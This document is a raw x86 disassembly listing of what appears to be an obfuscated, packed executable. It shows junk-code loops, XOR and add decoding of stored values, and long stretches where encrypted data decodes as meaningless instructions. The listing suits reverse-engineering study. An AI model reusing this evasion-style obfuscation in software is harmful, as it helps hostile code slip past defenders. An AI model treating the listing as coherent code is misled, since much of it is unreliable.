  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	int3   
  406312:	fcmovb st,st(2)
  406314:	push   es
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	push   esp
  40631e:	lods   eax,DWORD PTR ds:[esi]
  40631f:	add    cl,al
  406321:	fst    DWORD PTR [edi+0x30527b9b]
  406327:	call   0x2f75912e
  40632c:	xor    DWORD PTR [ebp+0x39efdccd],eax
  406332:	pop    edi
  406333:	push   0xda1f5a4d
  406338:	das    
  406339:	push   0xffffff9f
  40633b:	mov    bh,0xee
  40633d:	sub    al,0xf5
  40633f:	ins    DWORD PTR es:[edi],dx
  406340:	mov    gs,WORD PTR [edi+0x74ebb268]
  406346:	int3   
  406347:	iret   
  406348:	cwde   
  406349:	sub    DWORD PTR [ebx-0x8],esi
  40634c:	push   eax
  40634d:	jns    0x406373
  40634f:	adc    bh,BYTE PTR [edx+ecx*8-0x2d]
  406353:	test   dl,0x19
  406356:	ret    
  406357:	pop    ecx
  406358:	mov    BYTE PTR [ecx-0x6e],0x3b
  40635c:	inc    edx
  40635d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40635e:	add    eax,0xb714b33
  406363:	iret   
  406364:	xor    eax,0x70241af8
  406369:	loope  0x40630b
  40636b:	pop    edx
  40636c:	jmp    0xe77f6e4c
  406371:	mov    dl,0xd7
  406373:	ficomp WORD PTR [eax-0x43]
  406376:	sub    BYTE PTR [esi-0xd],al
  406379:	dec    eax
  40637a:	pusha  
  40637b:	fwait
  40637c:	ret    0xe69
  40637f:	push   ebp
  406380:	jle    0x40637f
  406382:	nop
  406383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406384:	push   es
  406385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406386:	push   ds
  406387:	cmp    dl,BYTE PTR [ebp+0x295119d8]
  40638d:	iret   
  40638e:	xchg   esp,eax
  40638f:	lock fsubr DWORD PTR [edx+0x3]
  406393:	ror    BYTE PTR [ebx-0x3],0xb7
  406397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406398:	pop    ecx
  406399:	xor    eax,0xd7a2311c
  40639e:	push   esi
  40639f:	xor    BYTE PTR [ecx+0x22c97a9a],ch
  4063a5:	inc    ebp
  4063a6:	test   cl,dl
  4063a8:	ret    0xf17a
  4063ab:	fwait
  4063ac:	inc    ecx
  4063ad:	mov    fs,WORD PTR [edi]
  4063af:	in     eax,dx
  4063b0:	jecxz  0x406351
  4063b2:	cmp    eax,0x729cbf5f
  4063b7:	cs es jg 0x406356
  4063bb:	dec    edi
  4063bc:	sbb    eax,0xa7e9c4b4
  4063c1:	xchg   ebp,eax
  4063c2:	sub    al,0x57
  4063c4:	mov    edx,0xe4e82683
  4063c9:	(bad)  
  4063cb:	aas    
  4063cc:	xor    BYTE PTR ds:0x5e9a30a2,dl
  4063d2:	cmp    bh,BYTE PTR [ecx]
  4063d4:	pop    edi
  4063d5:	lea    esi,[ebp+0x6fb9d55]
  4063db:	std    
  4063dc:	push   es
  4063dd:	shl    BYTE PTR ds:0x258dd88c,0x38
  4063e4:	and    dl,BYTE PTR [ebp-0x2b]
  4063e7:	cmp    DWORD PTR [edx-0x30],esi
  4063ea:	addr16 ret 
  4063ec:	cmp    BYTE PTR [ecx-0x2958f328],0xe2
  4063f3:	mov    eax,0x760cd925
  4063f8:	loopne 0x40641e
  4063fa:	scas   eax,DWORD PTR es:[edi]
  4063fb:	test   al,0x8f
  4063fd:	mov    esi,0x3aaab8ee
  406402:	xchg   edi,eax
  406403:	sub    BYTE PTR [edi+0x72],al
  406406:	nop
  406407:	pop    esi
  406408:	xor    ebp,eax
  40640a:	out    dx,eax
  40640b:	or     al,0x30
  40640d:	push   ebp
  40640e:	adc    BYTE PTR [edx+ebx*2+0x5aeb9de],dh
  406415:	ins    BYTE PTR es:[edi],dx
  406416:	push   ss
  406417:	pop    edx
  406418:	cmp    eax,0x38e7fcb7
  40641d:	shr    BYTE PTR [eax],1
  40641f:	in     al,0x76
  406421:	jge    0x4063ba
  406423:	outs   dx,BYTE PTR ds:[esi]
  406424:	pop    ds
  406425:	inc    ecx
  406426:	mov    bh,0xd2
  406428:	jnp    0x40648b
  40642a:	out    dx,al
  40642b:	ret    0xf729
  40642e:	fidivr WORD PTR [edi]
  406430:	mov    edx,0xec74865d
  406435:	mov    ch,0x43
  406437:	int    0x45
  406439:	jbe    0x4063fa
  40643b:	fmul   QWORD PTR [esi+0x810352]
  406441:	sub    edx,DWORD PTR [esi+0x571ecb6b]
  406447:	js     0x40644a
  406449:	cli    
  40644a:	(bad)  
  40644b:	jb     0x40649c
  40644d:	test   al,0x7e
  40644f:	sub    esi,DWORD PTR [edx+0x67128289]
  406455:	in     eax,dx
  406456:	aaa    
  406457:	cmp    ebp,DWORD PTR [ecx]
  406459:	mov    edx,0xb87aeb80
  40645e:	stos   DWORD PTR es:[edi],eax
  40645f:	daa    
  406460:	popa   
  406461:	push   ebx
  406462:	xchg   edx,eax
  406463:	inc    esp
  406464:	rcl    DWORD PTR [eax+eax*8-0x7f721edc],1
  40646b:	nop
  40646c:	ss push es
  40646e:	retf   0xa916
  406471:	jl     0x4064ca
  406473:	ins    BYTE PTR es:[edi],dx
  406474:	or     cl,BYTE PTR [edi-0x1a4ebc13]
  40647a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40647b:	clc    
  40647c:	out    dx,eax
  40647d:	dec    edi
  40647e:	and    al,0xd0
  406480:	jno    0x406439
  406482:	mov    ch,0x31
  406484:	xchg   edx,eax
  406485:	cmp    BYTE PTR [eax+0xf9329c1],bl
  40648b:	ss push esi
  40648d:	pop    eax
  40648e:	xchg   edi,eax
  40648f:	push   esp
  406490:	pop    edi
  406491:	push   cs
  406492:	xchg   ebx,eax
  406493:	repz pop es
  406495:	or     eax,0x4ee7b13f
  40649a:	bound  edx,QWORD PTR [esi]
  40649c:	(bad)  
  40649d:	mov    bl,0x51
  40649f:	mov    dl,0x1b
  4064a1:	into   
  4064a2:	xor    ecx,DWORD PTR [ecx+0x76c933b8]
  4064a8:	sbb    DWORD PTR [edi],eax
  4064aa:	test   BYTE PTR [edx-0x7dc0d9d1],bh
  4064b0:	(bad)  
  4064b1:	cli    
  4064b2:	fmul   QWORD PTR [edi+0x5990d0ce]
  4064b8:	pop    ebx
  4064b9:	js     0x406453
  4064bb:	clc    
  4064bc:	xor    edx,edi
  4064be:	mov    cl,0xea
  4064c0:	mov    ebp,0x8aef293d
  4064c5:	shl    DWORD PTR [esi-0x4f],cl
  4064c8:	sub    BYTE PTR [ecx-0x56],dh
  4064cb:	popa   
  4064cc:	lahf   
  4064cd:	and    BYTE PTR [bx+di],cl
  4064d0:	rcl    DWORD PTR [ecx+0x25a7c4eb],cl
  4064d6:	int    0x49
  4064d8:	push   edx
  4064d9:	in     eax,0xb0
  4064db:	in     al,0xbf
  4064dd:	into   
  4064de:	dec    esi
  4064df:	push   ebx
  4064e0:	jmp    0x1f7720e3
  4064e5:	jmp    0x4064cf
  4064e7:	inc    ebp
  4064e8:	cmp    al,0x60
  4064ea:	adc    bl,BYTE PTR [ecx-0x2e]
  4064ed:	jmp    0x406472
  4064ef:	sti    
  4064f0:	mov    ecx,0x65d7fd86
  4064f5:	popa   
  4064f6:	mov    eax,ds:0xe6a0cb85
  4064fb:	pop    edx
  4064fc:	mov    ah,0x31
  4064fe:	inc    edi
  4064ff:	inc    ah
  406501:	loope  0x4064e2
  406503:	add    bh,dh
  406505:	push   fs
  406507:	outs   dx,BYTE PTR ds:[esi]
  406508:	ret    
  406509:	das    
  40650a:	nop
  40650b:	cwde   
  40650c:	dec    ecx
  40650d:	(bad)  
  40650e:	adc    bh,cl
  406510:	fldcw  WORD PTR [edi+ecx*8-0x38a67e7a]
  406517:	imul   edi,ebx,0xa570a688
  40651d:	adc    ecx,0xca2fefdf
  406523:	sbb    ah,BYTE PTR [esi+0x1a]
  406526:	xchg   ebx,eax
  406527:	icebp  
  406528:	sub    dl,BYTE PTR [edx+0x2a]
  40652b:	or     ecx,DWORD PTR [esi-0x2b]
  40652e:	aaa    
  40652f:	test   eax,0xadf56e05
  406534:	imul   ebp,DWORD PTR [ebp+0x2],0x64
  406538:	clc    
  406539:	(bad)  
  40653a:	mov    bh,0x1a
  40653c:	pop    edx
  40653d:	xor    BYTE PTR [ebp-0x39111562],bh
  406543:	das    
  406544:	mov    edx,0x728c65a3
  406549:	jmp    0x3f57579
  40654e:	xor    BYTE PTR [ebp-0x5d],bl
  406551:	add    BYTE PTR [edi],ch
  406553:	mov    ebx,0xb0c2b574
  406558:	jo     0x4064f3
  40655a:	xchg   ebx,eax
  40655b:	and    eax,0xb8bc10bf
  406560:	push   es
  406561:	jb     0x40653b
  406563:	jg     0x406564
  406565:	add    eax,0x77d65774
  40656a:	popf   
  40656b:	imul   ebp,DWORD PTR [edx+0x47ede328],0x58
  406572:	jne    0x406592
  406574:	xor    DWORD PTR [ebx-0x74eca4c7],0x5f
  40657b:	inc    esp
  40657c:	int    0x34
  40657e:	fwait
  40657f:	push   ss
  406580:	dec    ecx
  406581:	or     eax,DWORD PTR [esi-0x668190cd]
  406587:	ss jecxz 0x40659a
  40658a:	icebp  
  40658b:	xchg   esp,eax
  40658c:	cmc    
  40658d:	mov    DWORD PTR [ebp+0x68c8fb6e],esi
  406593:	jns    0x4065e0
  406595:	adc    ebp,DWORD PTR [ebx]
  406597:	or     bh,dl
  406599:	daa    
  40659a:	mov    esi,DWORD PTR [edi-0x42ddee16]
  4065a0:	(bad)  
  4065a2:	out    0xe2,eax
  4065a4:	popa   
  4065a5:	push   0xfffffffe
  4065a7:	lahf   
  4065a8:	je     0x406576
  4065aa:	mov    ?,WORD PTR [edx]
  4065ac:	xor    eax,0xce1e55ec
  4065b1:	jge    0x4065f2
  4065b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b4:	mov    esp,0x5fda8026
  4065b9:	retf   
  4065ba:	mov    cl,0xe2
  4065bc:	xor    ebp,DWORD PTR [esi]
  4065be:	adc    cl,ah
  4065c0:	mov    ds:0xc8c89e10,eax
  4065c5:	and    ecx,DWORD PTR [ecx+0x7eb306a4]
  4065cb:	js     0x406622
  4065cd:	imul   edx,DWORD PTR ds:0xa4e16e7,0x92ba482
  4065d7:	ret    0x460d
  4065da:	retf   0x7185
  4065dd:	mov    edx,0x8522c5ad
  4065e3:	std    
  4065e4:	pop    es
  4065e5:	(bad)  
  4065e6:	push   edx
  4065e7:	add    al,0x48
  4065e9:	rcl    BYTE PTR [ebx+0x27],cl
  4065ec:	(bad)  
  4065ed:	jbe    0x406659
  4065ef:	retf   0x5624
  4065f2:	mov    ebp,0x50927daf
  4065f7:	xchg   edi,eax
  4065f8:	js     0x4065e4
  4065fa:	or     al,0x82
  4065fc:	jo     0x406668
  4065fe:	fisub  WORD PTR [edx+0x31]
  406601:	in     eax,0x3e
  406603:	dec    ebp
  406604:	pop    ebx
  406605:	ret    0xf1c9
  406608:	jae    0x406650
  40660a:	jp     0x406657
  40660c:	ins    DWORD PTR es:[edi],dx
  40660d:	mov    esi,0x365da506
  406612:	add    bl,0x8a
  406615:	pop    esp
  406616:	push   ss
  406617:	adc    BYTE PTR [eax],al
  406619:	nop
  40661a:	pop    esi
  40661b:	mov    ah,0x89
  40661d:	jnp    0x406639
  40661f:	xchg   esp,eax
  406620:	lds    ebp,FWORD PTR [ebx+eax*2-0x6]
  406624:	jb     0x4065f2
  406626:	dec    ebp
  406627:	or     esp,ecx
  406629:	fidiv  WORD PTR [esi-0x78]
  40662c:	dec    eax
  40662d:	outs   dx,DWORD PTR ds:[esi]
  40662e:	(bad)  
  40662f:	sbb    eax,0xb8259afe
  406634:	xor    DWORD PTR [ecx-0x44a25e5e],0x8e486b9c
  40663e:	xchg   ebp,eax
  40663f:	repnz es enterw 0x677,0xa2
  406646:	jg     0x4066b5
  406648:	pop    ds
  406649:	inc    esi
  40664a:	(bad)  
  40664b:	xchg   ebp,eax
  40664c:	sbb    al,0x8b
  40664e:	mov    ds:0x3e9d0ff,al
  406653:	add    BYTE PTR [eax],al
  406655:	add    BYTE PTR [ebx-0x3d36efbb],cl
  40665b:	or     al,0x0
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xa788055f
  406b85:	pop    esp
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x697e7e7f
  406b8f:	mov    ds:0xd53e649b,eax
  406b94:	loop   0x406b6f
  406b96:	inc    edi
  406b97:	out    dx,eax
  406b98:	adc    eax,0x6719d703
  406b9d:	pop    esp
  406b9e:	dec    edx
  406b9f:	icebp  
  406ba0:	or     ebx,ecx
  406ba2:	mov    bl,0x9f
  406ba4:	mov    ch,bl
  406ba6:	ja     0x406b5e
  406ba8:	adc    al,0x0
  406baa:	rcr    BYTE PTR [ebp-0x37820e5d],1
  406bb0:	mov    al,0xc2
  406bb2:	push   ds
  406bb3:	ja     0x406b56
  406bb5:	mov    eax,ds:0x89660fd3
  406bba:	jae    0x406b58
  406bbc:	add    DWORD PTR [ebp+0x71],esi
  406bbf:	retf   
  406bc0:	imul   ebp,DWORD PTR [eax],0xf2613a77
  406bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bc7:	lahf   
  406bc8:	jmp    0x6416:0xf6f004c8
  406bcf:	arpl   WORD PTR [ebx+ebx*8-0x926d589],ax
  406bd6:	pop    ebp
  406bd7:	out    dx,eax
  406bd8:	aad    0xfe
  406bda:	cwde   
  406bdb:	pop    ds
  406bdc:	dec    esp
  406bdd:	gs adc eax,0x3f6446bf
  406be3:	imul   ecx,esi,0xffffffb2
  406be6:	xlat   BYTE PTR ds:[ebx]
  406be7:	mov    ch,0x4d
  406be9:	pop    esp
  406bea:	fiadd  DWORD PTR [ebp-0x658c9e8f]
  406bf0:	in     eax,dx
  406bf1:	out    0x8e,eax
  406bf3:	mov    ah,0x45
  406bf5:	pusha  
  406bf6:	mov    al,0x94
  406bf8:	ss aam 0xf8
  406bfb:	mov    al,0x33
  406bfd:	mov    es,WORD PTR [eax+ebx*4+0x20]
  406c01:	add    al,0xf2
  406c03:	es xor dl,0xb7
  406c07:	jecxz  0x406c4f
  406c09:	sub    BYTE PTR [esi],cl
  406c0b:	dec    eax
  406c0c:	stos   BYTE PTR es:[edi],al
  406c0d:	mov    ebx,0x1e92f219
  406c12:	jmp    0x406c8d
  406c14:	xchg   esi,eax
  406c15:	dec    ebx
  406c16:	jge    0x406c66
  406c18:	xchg   edi,eax
  406c19:	pushf  
  406c1a:	push   0xffffff86
  406c1c:	shl    cl,cl
  406c1e:	dec    esi
  406c1f:	mov    eax,ds:0x8b3cf170
  406c24:	sbb    eax,eax
  406c26:	jl     0x406bd6
  406c28:	push   ebx
  406c29:	cmp    dl,al
  406c2b:	iret   
  406c2c:	cmp    ebx,DWORD PTR [ecx+0x50e9b691]
  406c32:	push   0x677f0088
  406c37:	and    BYTE PTR [ecx+0x68],0x12
  406c3b:	mov    edi,0xb0713495
  406c40:	xchg   ebx,eax
  406c41:	dec    esi
  406c42:	hlt    
  406c43:	in     eax,dx
